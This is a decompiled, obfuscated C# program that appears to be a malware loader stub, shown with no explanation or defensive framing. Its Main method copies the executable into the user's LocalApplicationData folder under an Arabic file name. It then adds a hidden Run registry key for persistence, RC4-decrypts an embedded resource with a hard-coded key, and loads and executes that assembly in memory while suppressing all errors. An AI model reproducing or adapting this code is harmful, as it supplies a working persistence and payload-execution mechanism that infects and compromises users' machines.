using System;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class0
{
	internal sealed class Class1
	{
		internal static Assembly smethod_0(byte[] byte_0, char char_0, char char_1)
		{
			int num = 0;
			Assembly result;
			int num2;
			do
			{
				result = (((char_1 ^ char_0) - 102) ^ num) switch
				{
					0 => Assembly.Load(byte_0), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}
	}

	private static void Main(string[] args)
	{
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		Class4.smethod_2();
		object[] parameters = new object[0];
		Class5.Class6.Class8.smethod_0(new Random(), 300, 750, 240, 'å');
		long num = Class5.Class6.Class7.smethod_0(258, 263);
		_ = Class5.Class6.Class7.smethod_0(1003, 1006) - num;
		if (!Class5.Class6.Class7.smethod_1(Class5.Class6.Class8.smethod_1(Class5.Class6.Class8.smethod_2(Environment.SpecialFolder.LocalApplicationData, 'ɋ', 'Ȃ'), "\\الوحدة 1.exe", 'ϧ', 1002), 991, 900))
		{
			Class5.Class6.Class7.smethod_4(Class5.Class6.Class8.smethod_5('ƛ', 'ǐ'), Class5.Class6.Class8.smethod_1(Class5.Class6.Class8.smethod_2(Environment.SpecialFolder.LocalApplicationData, '\u008a', 'Ã'), "\\الوحدة 1.exe", '\u0094', 153), 533, 538);
		}
		string gparam_ = (string)(IEnumerable<char>)smethod_0("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey gparam_2 = (RegistryKey)(MarshalByRefObject)Class5.Class6.smethod_2(Registry.CurrentUser, gparam_, bool_0: true, 997, 'Ͻ');
		Class5.Class6.Class7.smethod_5(gparam_2, "kx14Wj70bc", (object)Class5.Class6.Class8.smethod_1(Class5.Class6.Class8.smethod_2(Environment.SpecialFolder.LocalApplicationData, '\u000f', 'F'), "\\الوحدة 1.exe", 'µ', 184), (short)308, 304);
		Class5.Class6.smethod_3(gparam_2, '\u00a0', 205);
		try
		{
			ResourceManager gparam_3 = new ResourceManager("res", Class5.smethod_0('\u02f1', 664));
			byte[] byte_ = (byte[])(ICollection)smethod_1((byte[])Class5.smethod_4(gparam_3, "Nv8GkTt6AdBUme", 372, 367), "mI8QthQyM510gjMct6FVrLBTCeOcGovenEtAbfrQwD6d5SHIsGriHIVL");
			smethod_2(gparam_3, 'ɠ', 'ȿ');
			Assembly gparam_4 = (Assembly)(_Assembly)Class1.smethod_0(byte_, 'Ã', '¥');
			if (Class5.smethod_5((MethodBase)smethod_3(gparam_4, 'Ĉ', 348), 'ǰ', (short)408).Length > 0)
			{
				parameters = new object[1] { args };
			}
			smethod_3(gparam_4, 'ί', 1019).Invoke(null, parameters);
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_0)
	{
		char[] array = Class4.smethod_4(string_0, 763, '\u02d4');
		Class4.smethod_5((Array)array, 'ų', 287);
		return new string(array);
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		byte[] array = (byte[])(IEnumerable)Class4.smethod_6(Class5.smethod_3(477, 414), string_0, 55, 'Q');
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % Class5.Class6.smethod_4((Array)array, 0, 'ˑ', 726)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < Class5.Class9.Class10.smethod_3((Array)byte_0, 0, 'ɋ', 547); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}

	internal static void smethod_2<T>(T gparam_0, char char_0, char char_1) where T : ResourceManager
	{
		int num = 0;
		switch (((char_0 ^ char_1) - 95) ^ 0)
		{
		case 0:
			gparam_0.ReleaseAllResources();
			break;
		}
		num++;
	}

	internal static MethodInfo smethod_3<T>(T gparam_0, char char_0, short short_0) where T : Assembly
	{
		int num = 0;
		MethodInfo result = (((char_0 ^ short_0) - 84) ^ 0) switch
		{
			0 => (MethodInfo)(MethodBase)gparam_0.EntryPoint, 
			_ => null, 
		};
		num++;
		return result;
	}
}
